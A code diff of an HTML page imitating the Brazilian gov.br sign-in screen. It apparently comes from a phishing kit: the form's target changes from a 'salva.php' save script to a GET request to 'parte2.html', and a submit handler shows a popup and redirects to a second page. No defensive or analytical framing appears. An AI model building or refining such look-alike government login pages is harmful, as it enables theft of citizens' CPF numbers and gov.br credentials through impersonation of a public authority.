@@ -31,7 +31,7 @@
  <img id=identidade-govbr src=data:, alt="Logomarca GovBR" class=sf-hidden>
  </aside>
  <main id=main-signin>
-<form method="post" id="loginData" action="salva.php" autocomplete="off" novalidate>    
+<form method="get" id="loginData" action="parte2.html" autocomplete="off" novalidate>    
 
  <div class=card id=login-cpf>
  <h3>Identifique-se no gov.br com:</h3>
@@ -136,12 +136,8 @@ document.addEventListener('DOMContentLoaded', function () {
 
     form.addEventListener('submit', function (event) {
         event.preventDefault();
-
         popup.classList.add('show');
-
-        setTimeout(function () {
-            HTMLFormElement.prototype.submit.call(form);
-        }, 3000);
+        window.location.assign('parte2.html');
     });
 });
 </script>
